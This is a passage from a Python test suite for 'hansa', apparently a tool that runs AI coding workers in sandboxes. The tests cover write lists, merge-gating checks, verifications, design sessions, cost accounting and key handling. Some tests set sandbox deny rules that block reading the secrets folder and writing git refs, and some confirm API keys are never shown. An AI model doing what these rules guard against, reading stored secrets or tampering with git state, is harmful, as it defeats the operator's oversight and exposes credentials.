            self.assertIn("the home folder of the user hansa runs as", str(e.exception.code))
            self.assertEqual(self.desk.settings_path.read_text(), before)

    def test_a_lanes_write_list_reaches_the_sandbox(self):
        from hansa import run
        p = self.desk.settings()["providers"]["claude"]
        box = run.sandbox_settings(self.desk, {"network": []}, "claude", p, self.repo)["sandbox"]
        self.assertNotIn("allowWrite", box["filesystem"])  # the worktree and the temporary folder only
        cache = self.tmp / "m2"
        box = run.sandbox_settings(self.desk, {"write": [str(cache), "/opt/cache"]}, "claude", p, self.repo)["sandbox"]
        self.assertEqual(box["filesystem"]["allowWrite"][0], str(cache))
        self.assertIn(str(cache.resolve()), box["filesystem"]["allowWrite"])  # links resolved too, like denyRead
        self.assertIn("/opt/cache", box["filesystem"]["allowWrite"])
        self.assertIn(str(self.desk.secrets_dir), box["filesystem"]["denyRead"])  # the denials stay as they were
        self.assertIn(str(self.repo.resolve() / ".git" / "refs"), box["filesystem"]["denyWrite"])

    def test_a_lanes_write_list_change_is_recorded_for_the_principal(self):
        self.assertNotIn("Tell the principal", self.hansa("lane", "set", "a", "write"))  # [] -> []: no change
        self.assertEqual(self.events("lane_write_changed"), [])
        out = self.hansa("lane", "set", "a", "write", "/opt/m2")
        self.assertIn('write: [] -> ["/opt/m2"]', out)
        self.assertIn("Tell the principal", out)
        self.assertEqual(len(self.events("lane_write_changed")), 1)
        self.assertNotIn("Tell the principal", self.hansa("lane", "set", "a", "write", "/opt/m2"))
        self.hansa("lane", "set", "a", "write", "/opt/m2", "/opt/npm")
        self.assertNotIn("Tell the principal", self.hansa("lane", "set", "a", "write", "/opt/npm", "/opt/m2"))
        self.assertEqual(len(self.events("lane_write_changed")), 2)
        self.assertIn("  folders a worker may also write (a build or test tool's cache): /opt/npm, /opt/m2\n",
                      views.explain_text(self.desk, "lane", "a"))
        self.assertIn("Tell the principal", self.hansa("lane", "set", "a", "write"))
        self.assertEqual([(e["lane"], e["old"], e["new"]) for e in self.events("lane_write_changed")],
                         [("a", [], ["/opt/m2"]), ("a", ["/opt/m2"], ["/opt/m2", "/opt/npm"]),
                          ("a", ["/opt/npm", "/opt/m2"], [])])
        self.assertIn("folders a worker may also write (a build or test tool's cache): none",
                      views.explain_text(self.desk, "lane", "a"))

    def test_design_sessions_and_provider_checks_run_outside_the_sandbox(self):
        from hansa import run
        tid = self.desk.new_task("Make the badge bigger")
        self.desk.update(tid, lane="a", provider="claude", worktree=str(self.repo), session_id="sid-d",
                         model_asked="sonnet")
        argv, _, _ = run.design_command(self.desk, tid)
        self.assertIsNone(self.sandbox_of(argv))
        self.assertFalse([r for r in self.denied_by(argv) if r.startswith("Bash(git")])
        seen = {}

        def answer(argv, **kwargs):
            seen["argv"] = argv
            return subprocess.CompletedProcess(argv, 0, json.dumps({"type": "result", "result": "OK"}), "")
        with unittest.mock.patch.object(run.subprocess, "run", answer):
            self.assertTrue(run.check_provider(self.desk, "claude")["ok"])
        self.assertIsNone(self.sandbox_of(seen["argv"]))

    def test_lane_check_runs_after_the_worker_and_gates_the_merge(self):
        s = self.desk.settings()
        s["lanes"]["a"]["check"] = "test -f hello.txt && echo checked"
        self.assertEqual(self.desk.save_settings(s), [])
        d = Dispatcher(self.desk)
        m = self.settle(d, self.desk.new_task("Add hello.txt"))
        self.assertEqual((m["state"], m["check"]["ok"]), ("done", True), m)
        self.assertIn("checked", m["check"]["tail"])
        s = self.desk.settings()
        s["lanes"]["a"]["check"] = "echo not good; exit 3"
        self.assertEqual(self.desk.save_settings(s), [])
        m = self.settle(d, self.desk.new_task("Add hello.txt again"))
        self.assertEqual((m["state"], m["check"]["ok"], m["check"]["exit"]), ("done", False, 3), m)
        self.assertEqual(m["check"]["tail"], ["not good"])  # the check's exit code, not the log reader's
        self.assertIn("not good", (self.desk.tasks_dir / m["id"] / "check.log").read_text())
        self.assertIn("FAILED (exit 3)", views.show_text(self.desk, m["id"]))
        self.assertIn("check FAILED", views.status_text(views.status(self.desk)))
        with self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "merge", m["id"]])
        main(["--desk", str(self.desk.root), "merge", m["id"], "--despite-check"])
        self.assertEqual(self.desk.meta(m["id"])["state"], "merged")

    def test_the_lane_check_runs_in_srt_with_the_lanes_sandbox(self):
        s = self.desk.settings()
        s["lanes"]["a"].update(check='test -f hello.txt && echo "tmp=$TMPDIR"', network=["pypi.org"])
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["check"]["ok"]), ("done", True), m)
        [call] = self.srt_calls()
        self.assertEqual(call["argv"][2:], ["--", "sh", "-c", 'test -f hello.txt && echo "tmp=$TMPDIR"'])
        self.assertEqual(call["stdout"], "pipe")  # not the log file in the raw folder srt hides
        self.assertEqual(Path(call["cwd"]).resolve(), Path(m["worktree"]).resolve())
        got = call["settings"]
        self.assertEqual(got["network"], {"allowedDomains": ["pypi.org"], "deniedDomains": []})
        self.assertIn(str(self.desk.state_dir), got["filesystem"]["denyRead"])
        self.assertIn(str(Path(m["worktree"]) / ".git"), got["filesystem"]["denyWrite"])
        self.assertIn(m["worktree"], got["filesystem"]["allowWrite"])
        self.assertIn(call["tmpdir"], got["filesystem"]["allowWrite"])  # TMPDIR is a folder the check may write
        self.assertIn("tmp=" + call["tmpdir"], m["check"]["tail"])
        self.assertTrue(call["tmp_there"])
        self.assertFalse(Path(call["tmpdir"]).exists())
        self.assertEqual(m["sandbox_tmp"], [])

    def test_check_result_survives_a_server_restart(self):
        s = self.desk.settings()
        s["lanes"]["a"]["check"] = "sleep 0.5; exit 0"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        d, end = Dispatcher(self.desk), time.time() + 20
        while not self.desk.meta(tid).get("check_started") and time.time() < end:
            d.tick()
            time.sleep(0.05)
        d.procs[tid].wait()  # the old server is gone; its check still wrote the exit code
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["check"]["ok"]), ("done", True), m)

    def test_a_check_cancelled_while_it_runs_leaves_no_process_behind(self):
        from hansa.run import alive, group_running
        pidfile = self.tmp / "check.pid"
        s = self.desk.settings()
        s["lanes"]["a"]["check"] = f"echo $$ > {pidfile}; sleep 30"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        d, end = Dispatcher(self.desk), time.time() + 20
        while not pidfile.exists() and time.time() < end:
            d.tick()
            time.sleep(0.05)
        group, check = self.desk.meta(tid)["pid"], int(pidfile.read_text())
        self.addCleanup(lambda: alive(check) and os.kill(check, 9))
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "cancel", tid])
        m = self.settle(d, tid)
        self.assertEqual((m["state"], m["check"]["note"]), ("cancelled", "stopped on request"), m)
        self.assertFalse(group_running(group))  # the check, srt and the log's reader
        self.assertFalse(alive(check))

    def test_a_refused_task_moves_on_without_resting_the_provider(self):
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        s["lanes"]["a"]["providers"] = ["mimo", "claude"]
        s["lanes"]["a"]["env"] = {"FAKE_REFUSE_ON_COMPAT": "1"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-test-01")
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Add hello.txt"))
        self.assertEqual((m["state"], m["provider"]), ("done", "claude"), m)
        self.assertEqual(m["attempts"][0]["kind"], "refused")
        self.assertEqual(provider_problem(self.desk, self.desk.settings(), "mimo"), "")
        s = self.desk.settings()
        s["lanes"]["a"]["providers"] = ["mimo"]
        self.assertEqual(self.desk.save_settings(s), [])
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Add hello.txt again"))
        self.assertEqual(m["state"], "failed", m)
        self.assertIn("no other provider", m["error"])

    def test_no_commits_means_no_check_and_the_task_can_be_closed(self):
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_NO_CHANGES": "1"}
        s["lanes"]["a"]["check"] = "false"
        self.assertEqual(self.desk.save_settings(s), [])
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Look around"))
        self.assertEqual((m["state"], m.get("commits"), m.get("check")), ("done", 0, None), m)
        self.assertIn("nothing to merge", views.show_text(self.desk, m["id"]))
        main(["--desk", str(self.desk.root), "cancel", m["id"]])
        self.assertEqual(self.desk.meta(m["id"])["state"], "cancelled")

    def test_retry_replaces_the_original(self):
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Add hello.txt"))
        main(["--desk", str(self.desk.root), "retry", m["id"], "also", "add", "a", "second", "line"])
        old = self.desk.meta(m["id"])
        self.assertEqual(old["state"], "replaced")
        self.assertNotIn(m["id"], [r["id"] for r in views.status(self.desk)["review"]])
        self.assertEqual(self.desk.meta(old["replaced_by"])["parent"], m["id"])

    def test_browser_is_given_to_one_task_at_a_time(self):
        with self.assertRaises(SystemExit):  # no browser set up: refuse, queue nothing
            main(["--desk", str(self.desk.root), "add", "Look at the page", "--browser"])
        self.assertEqual(self.desk.tasks(), [])
        seen = self.tmp / "argv.jsonl"
        s = self.desk.settings()
        s["browser"] = "/usr/bin/env true"
        s["lanes"]["a"]["env"] = {"FAKE_SHOW_ARGV": str(seen)}
        self.assertEqual(self.desk.save_settings(s), [])
        main(["--desk", str(self.desk.root), "add", "Look at the page", "--browser"])
        main(["--desk", str(self.desk.root), "add", "Plain task"])
        d = Dispatcher(self.desk)
        for m in self.desk.tasks():
            self.settle(d, m["id"])
        with_browser, plain = [json.loads(x) for x in seen.read_text().splitlines()]
        self.assertIn("--mcp-config", with_browser)
        self.assertIn("mcp__browser", with_browser)
        self.assertNotIn("--mcp-config", plain)
        self.assertNotIn("mcp__browser", plain)
        cfg = json.loads(Path(with_browser[with_browser.index("--mcp-config") + 1]).read_text())
        self.assertEqual(cfg["mcpServers"]["browser"]["args"][1:], [str(self.desk.tasks_dir / "t0001" / "browser"),
                                                                    "/usr/bin/env true"])
        self.assertIn("with a browser", views.show_text(self.desk, "t0001"))

    def test_stopped_worker_still_hands_in_what_it_wrote(self):
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://x"}
        s["lanes"]["a"]["providers"] = ["mimo"]
        s["lanes"]["a"]["env"] = {"FAKE_STOP_AT_TURNS": "1"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-test-01")
        tid = self.desk.new_task("Look at the page", model="sonnet")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual(m["state"], "failed")
        self.assertEqual(m["model_asked"], "mimo-x")  # a task's --model is for Claude providers only
        self.assertTrue(m["error"].startswith("stopped at the ceiling of 300 turns: the task was probably too big"), m)
        shown = views.show_text(self.desk, tid)
        self.assertIn("Stopped at the ceiling before it wrote its report", shown)
        self.assertIn("week badge is still in English", shown)
        self.assertIn("split the task or make it clearer", shown)
        self.assertEqual((m["usage"]["mimo-x"]["in"], m["usage"]["mimo-x"]["cache_read"]), (1400, 6000))  # no totals
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "retry", tid, "only the detail page"])
        follow = (self.desk.tasks_dir / "t0002" / "task.md").read_text()
        self.assertIn("The previous attempt's report:", follow)
        self.assertIn("week badge is still in English", follow)

    def transcript_run(self, kind: str, key: str = "") -> str:
        """The report of a worker run on mimo whose stand-in writes a session record of this kind."""
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://x"}
        s["lanes"]["a"]["providers"] = ["mimo"]
        s["lanes"]["a"]["env"] = {"FAKE_TRANSCRIPT": kind, **({"FAKE_WRITE": key} if key else {})}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", key or "sk-test-01")
        tid = self.desk.new_task("Fix the badge")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual(m["state"], "done", m)
        return (self.desk.tasks_dir / tid / "result.md").read_text()

    def test_a_report_followed_by_a_background_notice_is_kept(self):
        key = "sk-test-late-0421"
        report = self.transcript_run("late", key)
        self.assertEqual(report, "Report: fixed the badge; the tests pass. Key: [key of mimo]\n\n"
                                 "(Written after that, when a background notice came in:)\n\n"
                                 "That notice is the watch. My report above is still my final report.\n")
        shown = views.show_text(self.desk, "t0001")
        self.assertLess(shown.index("Report: fixed the badge"), shown.index("That notice is the watch"))
        self.assertNotIn(key, shown)

    def test_a_report_with_no_notice_after_it_is_unchanged(self):
        self.assertEqual(self.transcript_run("plain"), "Report: fixed the badge; the tests pass.\n")

    def test_without_a_session_record_the_report_is_the_last_message(self):
        tid = self.desk.new_task("Add hello.txt")
        self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((self.desk.tasks_dir / tid / "result.md").read_text(),
                         "Added hello.txt. Checked it exists.\n")

    def test_verify_runs_the_change_and_holds_the_merge(self):
        seen = self.tmp / "argv.jsonl"
        d = Dispatcher(self.desk)
        tid = self.desk.new_task("Add hello.txt")
        self.settle(d, tid)
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_VERDICT": "does not hold", "FAKE_SHOW_ARGV": str(seen)}
        s["lanes"]["a"]["check"] = "exit 1"  # a verification is never merged, so its branch is not checked
        self.assertEqual(self.desk.save_settings(s), [])
        self.assertIn(f"then hansa verify {tid} (code or tests) or hansa merge {tid}", views.show_text(self.desk, tid))
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "verify", tid, "the file's contents"])
        vid = self.desk.meta(tid)["verify"]
        v = self.desk.meta(vid)
        self.assertEqual((v["kind"], v["parent"], v["start_from"]), ("verify", tid, self.desk.meta(tid)["head"]))
        with self.assertRaises(SystemExit):  # not while the verification runs
            main(["--desk", str(self.desk.root), "merge", tid])
        self.assertIn(f"next: wait for the verification: hansa wait {vid}", views.show_text(self.desk, tid))
        v = self.settle(d, vid)
        self.assertEqual((v["state"], v["verdict"], v.get("check")), ("done", "does not hold", None))
        self.assertEqual((v["commits"], v["files"]), (0, []))  # its scratch changes are set aside, not committed
        wt = Path(v["worktree"])
        self.assertEqual(subprocess.run(["git", "status", "--porcelain"], cwd=wt, capture_output=True,
                                        text=True).stdout, "")
        self.assertIn(vid, subprocess.run(["git", "stash", "list"], cwd=wt, capture_output=True, text=True).stdout)
        argv = json.loads(seen.read_text().splitlines()[-1])
        self.assertIn("Bash(git checkout:*)", argv)
        self.assertNotIn("Bash(git stash:*)", argv[argv.index("--allowedTools"):])
        self.assertIn("checking another worker's finished task", argv[argv.index("--append-system-prompt") + 1])
        self.assertIn("Run first", (self.desk.tasks_dir / vid / "task.md").read_text())
        st = views.status(self.desk)
        self.assertEqual([m["id"] for m in st["review"]], [tid])  # the verification is not up for review itself
        self.assertIn(f"verification {vid}: does not hold", views.status_text(st))
        self.assertIn(f"{vid}: does not hold", views.show_text(self.desk, tid))
        self.assertIn(f"more lines; the whole report is {self.desk.tasks_dir / vid / 'result.md'}",
                      views.show_text(self.desk, vid))
        for args in (["merge", vid], ["merge", tid]):  # never merged itself; "does not hold" holds the task
            with self.assertRaises(SystemExit):
                main(["--desk", str(self.desk.root), *args])
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "merge", tid, "--despite-check"])
        self.assertEqual((self.desk.meta(tid)["state"], self.desk.meta(vid)["state"]), ("merged", "cancelled"))
        self.assertIn("verdict: does not hold", views.show_text(self.desk, vid))

    def test_design_session_opens_for_the_principal_and_comes_back_for_review(self):
        try:
            tmux = tmux_bin()
        except RuntimeError:
            self.skipTest("no tmux here")
        sockets = unittest.mock.patch.dict(os.environ, {"TMUX_TMPDIR": str(self.tmp)})  # not /tmp, tmux's default
        sockets.start()
        self.addCleanup(sockets.stop)
        probe = [tmux, "-L", tmux_socket(self.desk) + "-probe"]
        subprocess.run(probe + ["new-session", "-d", "sleep 5"], capture_output=True, timeout=30)
        if subprocess.run(probe + ["kill-server"], capture_output=True, timeout=30).returncode:
            self.skipTest("tmux cannot make its socket here (a sandbox refuses to create Unix sockets)")
        seen = self.tmp / "argv.jsonl"
        s = self.desk.settings()
        s["providers"]["claude"]["config_dir"] = str(self.tmp / "cc")
        s["lanes"]["a"]["env"] = {"FAKE_SHOW_ARGV": str(seen), "FAKE_DESIGN_SECONDS": "2"}
        s["lanes"]["a"]["preview"] = "npm run dev"
        s["lanes"]["a"]["check"] = "true && echo checked"
        s["lanes"]["a"]["setup"] = "echo installing"
        self.assertEqual(self.desk.save_settings(s), [])
        self.addCleanup(subprocess.run, [tmux, "-L", tmux_socket(self.desk), "kill-server"], capture_output=True)
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "design", "Make the week badge bigger", "--lane", "a"])
        tid = "t0001"
        with self.assertRaises(SystemExit):  # one design session per lane at a time
            main(["--desk", str(self.desk.root), "design", "Another one", "--lane", "a"])
        d = Dispatcher(self.desk)
        d.tick()
        m = self.desk.meta(tid)
        self.assertEqual((m["state"], m["kind"], Path(m["worktree"]).name), ("running", "design", "a-design"))
        st = views.status(self.desk)
        self.assertIn(f"attach -t design-{tid}", st["design"][0]["join"])
        self.assertEqual(st["running"], [])  # it does not take the lane's worker slot
        self.assertIn(f"design-{tid}", [a for a in st["asks"] if a["by"] == "hansa"][0]["text"])
        work = self.desk.new_task("Add hello.txt", lane="a")
        self.assertEqual(self.settle(d, work)["state"], "done")  # the lane kept working meanwhile
        m = self.settle(d, tid)
        self.assertEqual(m["state"], "done", m)
        self.assertEqual((m["files"], m["turns"]), (["badge.txt"], 2))
        self.assertEqual(m["usage"]["claude-x"]["in"], 200)
        self.assertIn("installing", (self.desk.tasks_dir / tid / "setup.log").read_text())  # set up before it opened
        shown = views.show_text(self.desk, tid)
        self.assertIn("Hand-in: the badge is bigger", shown)
        self.assertEqual([a for a in self.desk.asks() if a["by"] == "hansa" and not a["closed"]], [])
        runs = [json.loads(x) for x in seen.read_text().splitlines()]
        self.assertEqual(sum("-p" in a for a in runs), 1)  # the worker's; the design session is interactive
        argv = next(a for a in runs if "-p" not in a)
        self.assertIn("Make the week badge bigger", argv[1])
        self.assertEqual(argv[argv.index("--permission-mode") + 1], "dontAsk")
        self.assertIn("Bash(npm run dev:*)", argv)
        self.assertIn("Bash(git merge:*)", argv)
        self.assertIn("Bash(git commit:*)", argv)  # the principal is there: the session commits each step itself
        self.assertIn("Bash(echo checked:*)", argv)  # and may run the lane's check, one rule per command in it
        self.assertIn("No browser is set up", argv[argv.index("--append-system-prompt") + 1])
        self.assertIn("--strict-mcp-config", argv)  # a design session sees no more of the account than a worker
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "merge", tid])
        self.assertTrue((self.repo / "badge.txt").exists())
        self.assertEqual({r["task"]: r["seat"] for r in cost.worker_rows(self.desk, 0)}, {tid: "design", work: "worker"})

    def test_a_design_session_tmux_did_not_open_fails_without_asking_the_principal(self):
        fake = self.tmp / "tmux"  # like tmux that cannot make its socket: it says so, exits 0, and opens nothing
        fake.write_text("#!/bin/sh\necho 'error creating /tmp/tmux-501/hansa-x (Operation not permitted)' >&2\nexit 0\n")
        fake.chmod(0o755)
        with unittest.mock.patch.dict(os.environ, {"HANSA_TMUX": str(fake)}), contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "design", "Make the week badge bigger", "--lane", "a"])
            Dispatcher(self.desk).tick()
        m = self.desk.meta("t0001")
        self.assertEqual(m["state"], "failed", m)
        self.assertIn("tmux did not open the design session; it printed: error creating /tmp/tmux-501/hansa-x "
                      "(Operation not permitted)", m["error"])
        self.assertEqual([a for a in self.desk.asks() if a["by"] == "hansa"], [])
        self.assertEqual(views.status(self.desk)["design"], [])

    def test_a_running_task_shows_how_far_the_worker_has_got(self):
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://x"}
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Look at something slowly")
        self.desk.update(tid, state="running", lane="a", provider="mimo", model_asked="mimo-x", started=time.time() - 600,
                         session_id="sid-1", pid=None)
        rec = self.desk.state_dir / "claude-mimo" / "projects" / "-work" / "sid-1.jsonl"
        rec.parent.mkdir(parents=True)
        rec.write_text("".join(json.dumps({"type": "assistant", "message": {"id": f"m{i}", "content": [
            {"type": "text", "text": t}]}}) + "\n" for i, t in enumerate(["Reading the code.", "Now the tests."])))
        run = views.status(self.desk)["running"][0]
        self.assertEqual((run["progress"]["replies"], run["progress"]["idle_min"]), (2, 0))
        self.assertIn("so far: 2 model replies, last activity 0 min ago; last note: Now the tests.",
                      views.show_text(self.desk, tid))
        self.assertNotIn("0 turns", views.show_text(self.desk, tid))  # turns are counted when it ends
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            main(["--desk", str(self.desk.root), "wait", tid, "--timeout", "0.001", "--every", "0.01"])
        self.assertIn(f"no task finished in 0.001 min\n{tid} running 10 min, so far: 2 model replies", out.getvalue())

    def test_browser_tool_is_not_told_where_the_worker_works(self):
        folder = self.tmp / "browser"
        folder.mkdir()
        fake = self.tmp / "fake_browser.py"
        fake.write_text("import os, sys\nwith open('seen.txt', 'w') as f:\n"
                        "    f.write(os.getcwd() + '\\n')\n    f.writelines(sys.stdin)\nprint('bye')\n")
        init = {"jsonrpc": "2.0", "id": 0, "method": "initialize",
                "params": {"capabilities": {"roots": {"listChanged": True}}, "clientInfo": {"name": "claude-code"}}}
        call = {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "browser_take_screenshot"}}
        relay = Path(__file__).resolve().parent.parent / "hansa" / "relay.py"
        out = subprocess.run([sys.executable, str(relay), str(folder), f"{sys.executable} {fake}"],
                             input="".join(json.dumps(m) + "\n" for m in (init, call)),
                             capture_output=True, text=True, timeout=30)
        self.assertEqual((out.returncode, out.stdout), (0, "bye\n"))
        cwd, *lines = (folder / "seen.txt").read_text().splitlines()
        self.assertEqual(Path(cwd).resolve(), folder.resolve())
        got = [json.loads(x) for x in lines]
        self.assertEqual(got[0]["params"]["capabilities"], {})
        self.assertEqual(got[1], call)

    def test_waiting_reason_names_the_missing_piece(self):
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": ""}
        s["lanes"]["a"]["providers"] = ["mimo"]
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Anything")
        Dispatcher(self.desk).tick()
        self.assertEqual(self.desk.meta(tid)["state"], "queued")
        why = waiting_reason(self.desk, self.desk.settings(), self.desk.meta(tid), set())
        self.assertIn("mimo: no endpoint address", why)

    def test_settings_refuse_keys_and_unknown_fields(self):
        s = self.desk.settings()
        s["providers"]["claude"]["api_key"] = "sk-no"
        self.assertTrue(any("keys are not kept" in p for p in validate(s)))
        s = self.desk.settings()
        s["lanes"]["a"]["surprise"] = 1
        s["lanes"]["a"]["env"] = {"ANTHROPIC_BASE_URL": "x"}
        probs = validate(s)
        self.assertTrue(any("unknown field" in p for p in probs))
        self.assertTrue(any("set from the provider" in p for p in probs))

    def test_key_that_does_not_look_like_a_key_is_refused(self):
        for bad in ("MIMO_API_KEY=abc", "sk-abc def", '"sk-abc"', "sk-ab***yz", "Bearer sk-abc"):
            with self.assertRaises(ValueError):
                self.desk.write_key("mimo", bad)
        self.assertFalse(self.desk.has_key("mimo"))

    def test_keys_are_private_and_never_shown(self):
        self.desk.write_key("mimo", "sk-secret")
        mode = stat.S_IMODE(os.stat(self.desk.key_file("mimo")).st_mode)
        self.assertEqual(mode, 0o600)
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "m", "effort": "", "base_url": "https://x"}
        self.desk.save_settings(s)
        pub = json.dumps(public_settings(self.desk))
        self.assertNotIn("sk-secret", pub)
        self.assertTrue(public_settings(self.desk)["keys"]["mimo"])

    def test_cost_counts_workers_and_coordinator_once(self):
        tid = self.desk.new_task("Add hello.txt")
        self.settle(Dispatcher(self.desk), tid)
        conf = self.tmp / "conf"
        proj = conf / "projects" / cost.slug(self.desk.root)
        proj.mkdir(parents=True)
        line = {"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()), "message": {
            "id": "msg_1", "model": "claude-opus-5", "usage": {"input_tokens": 100, "output_tokens": 10,
                                                               "cache_read_input_tokens": 0, "cache_creation_input_tokens": 0}}}
        (proj / "s.jsonl").write_text((json.dumps(line) + "\n") * 3)  # one message, logged three times
        helper = proj / "s" / "subagents"
        helper.mkdir(parents=True)
        (helper / "agent-1.jsonl").write_text(json.dumps({**line, "message": {**line["message"], "id": "msg_2"}}) + "\n")
        (helper / "agent-1.meta.json").write_text(json.dumps({"agentType": "scout"}))
        s = self.desk.settings()
        s["providers"]["claude"]["config_dir"] = str(conf)
        self.desk.save_settings(s)
        rep = cost.report(self.desk, 1)
        self.assertEqual(rep["by"]["seat"]["coordinator"]["tokens"], 110)
        self.assertEqual(rep["by"]["seat"]["helper:scout"]["tokens"], 110)
        later = cost.report(self.desk, 1, since=time.time() + 60)  # hansa cost --since: nothing after "now"
        self.assertEqual((later["total"]["tokens"], later["window"][:6]), (0, "since "))
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            main(["--desk", str(self.desk.root), "cost", "--since", time.strftime("%H:%M"), "--by", "seat"])
        self.assertIn("since ", out.getvalue())
        self.assertAlmostEqual(rep["by"]["seat"]["coordinator"]["usd"], (100 * 5 + 10 * 25) / 1e6, places=6)
        self.assertEqual(rep["by"]["seat"]["worker"]["tokens"], 6300)
        self.assertEqual(rep["unpriced_models"], [])

    def test_verifications_are_their_own_seat_in_the_cost(self):
        tid = self.desk.new_task("Run the change", kind="verify", parent="t0000")
        self.desk.update(tid, state="done", finished=time.time(), provider="claude",
                         usage={"claude-x": {"in": 10, "out": 1, "cache_read": 0, "cache_write": 0}})
        self.assertEqual([r["seat"] for r in cost.worker_rows(self.desk, 0)], ["verify"])

    def test_coordinator_cost_counts_every_provider_it_ran_on(self):
        s = self.desk.settings()
        s["providers"]["claude"]["config_dir"] = str(self.tmp / "cc")
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        self.assertEqual(self.desk.save_settings(s), [])
        for home, mid in ((self.tmp / "cc", "m1"), (self.desk.state_dir / "claude-mimo", "m2")):
            proj = home / "projects" / cost.slug(self.desk.root)
            proj.mkdir(parents=True)
            (proj / "s.jsonl").write_text(json.dumps({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
                "message": {"id": mid, "model": "claude-x", "usage": {"input_tokens": 10, "output_tokens": 2}}}) + "\n")
        rows = cost.transcript_rows(self.desk, 0)  # the coordinator ran on claude, then on mimo
        self.assertEqual(sorted((r["provider"], r["in"]) for r in rows), [("claude", 10), ("mimo", 10)])

    def test_settings_saved_from_a_stale_page_are_refused(self):
        first, second = public_settings(self.desk), public_settings(self.desk)  # two tabs, opened together
        first["settings"]["concurrency"] = 3
        self.assertEqual(self.desk.save_settings(first["settings"], rev=first["rev"]), [])
        second["settings"]["cool_minutes"] = 5
        problems = self.desk.save_settings(second["settings"], rev=second["rev"])
        self.assertTrue(problems and "changed since" in problems[0], problems)
        self.assertEqual((self.desk.settings()["concurrency"], self.desk.settings().get("cool_minutes", 30)), (3, 30))

    def test_a_check_that_ran_on_a_replaced_key_is_not_recorded(self):
        import hansa.run as run
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-old-key-0001")

        def key_replaced_meanwhile(argv, **kwargs):
            self.desk.write_key("mimo", "sk-new-key-0002")
            return subprocess.CompletedProcess(argv, 1, json.dumps({"type": "result", "is_error": True,
                "api_error_status": 401, "result": "API Error: 401 authentication_error"}), "")
        with unittest.mock.patch.object(run.subprocess, "run", key_replaced_meanwhile):
            r = run.check_provider(self.desk, "mimo")
        self.assertFalse(r["ok"])
        self.assertIn("changed while this check ran", r["detail"])
        self.assertFalse(provider_problem(self.desk, self.desk.settings(), "mimo"))  # the new key is not rested

    def test_status_says_which_build_runs_and_whether_cost_is_audited(self):
        st = views.status(self.desk)
        self.assertTrue(st["build"])
        self.assertIn(st["build"], views.status_text(st))
        self.assertNotIn("cost audit on", views.status_text(st))
        s = self.desk.settings()
        s["coordinator"]["audits_cost"] = True
        self.assertEqual(self.desk.save_settings(s), [])
        self.assertIn("cost audit on", views.status_text(views.status(self.desk)))
        self.assertIn("cost audit on", (Path(__file__).resolve().parent.parent / "hansa" / "card.md").read_text())

    def test_a_design_session_waiting_for_a_stopped_server_says_so(self):
        self.desk.new_task("Shape the badge", kind="design", lane="a")
        self.assertIn("`hansa serve` is not running", views.status(self.desk)["queued"][0]["waiting"])

    def test_helpers_name_only_tools_claude_code_has(self):
        code = Path(__file__).resolve().parent.parent / "hansa" / "agents"
        mine = {"operator.md": "tools: Read, Bash, Edit, Write"}  # the one helper that changes the machine
        for f in code.glob("*.md"):
            tools = next(x for x in f.read_text().splitlines() if x.startswith("tools:"))
            self.assertEqual(tools, mine.get(f.name, "tools: Read, Bash"), f.name)

    def test_the_page_only_shows_tasks_by_their_id(self):
        (self.desk.root / "x").mkdir()
        (self.desk.root / "x" / "meta.json").write_text(json.dumps({"id": "x", "title": "not a task", "state": "done"}))
        httpd = start_web(self.desk, "127.0.0.1", 0)
        base = f"http://127.0.0.1:{httpd.server_address[1]}"
        try:
